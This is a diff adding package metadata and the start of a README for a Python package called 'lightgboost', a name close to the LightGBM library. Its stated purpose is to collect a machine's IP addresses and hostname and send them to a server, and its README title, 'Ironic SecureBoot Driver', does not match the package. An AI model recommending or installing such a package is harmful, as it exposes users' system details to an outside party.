@@ -1,0 +1,33 @@
+Metadata-Version: 2.2
+Name: lightgboost
+Version: 1.1.2
+Summary: A Python package to collect and send system information.
+Home-page: https://github.com/JPD-12/lightgboost
+Author: JPD
+Author-email: jpdtester01@gmail.com
+License: MIT
+Classifier: Programming Language :: Python :: 3
+Classifier: License :: OSI Approved :: MIT License
+Classifier: Operating System :: OS Independent
+Description-Content-Type: text/markdown
+Requires-Dist: requests
+Dynamic: author
+Dynamic: author-email
+Dynamic: classifier
+Dynamic: description
+Dynamic: description-content-type
+Dynamic: home-page
+Dynamic: license
+Dynamic: requires-dist
+Dynamic: summary
+
+# Ironic SecureBoot Driver
+
+A Python package to collect system information (IP addresses, hostname, etc.) and send it to a specified server.
+
+## Installation
+
+To install this package, run:
+
+```bash
+pip install lightgboost
